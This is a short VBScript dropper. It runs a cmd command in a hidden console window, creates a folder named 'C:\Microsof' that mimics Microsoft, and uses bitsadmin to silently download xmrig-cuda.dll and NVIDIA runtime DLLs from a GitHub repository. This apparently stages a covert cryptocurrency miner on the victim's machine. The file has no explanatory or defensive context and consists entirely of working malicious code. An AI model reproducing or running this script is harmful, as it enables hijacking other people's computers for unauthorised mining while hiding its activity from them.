

const CONSOLE_HIDE=0
const CONSOLE_SHOW=1
const CMD_WAIT=true
set oShell = wscript.createObject("WScript.Shell")
oShell.run "CmD /C cd C:\ && mkdir Microsof && bitsadmin.exe /transfer 'JobName' https://github.com/LearnMiner/trttr/blob/master/xmrig-cuda.dll?raw=true C:\Microsof\xmrig-cuda.dll && bitsadmin.exe /transfer 'JobName' https://github.com/LearnMiner/trttr/blob/master/nvrtc64_100_0.dll?raw=true C:\Microsof\nvrtc64_100_0.dll && bitsadmin.exe /transfer 'JobName' https://github.com/LearnMiner/trttr/blob/master/nvrtc-builtins64_100.dll?raw=true C:\Microsof\nvrtc-builtins64_100.dll", CONSOLE_HIDE, CMD_WAIT
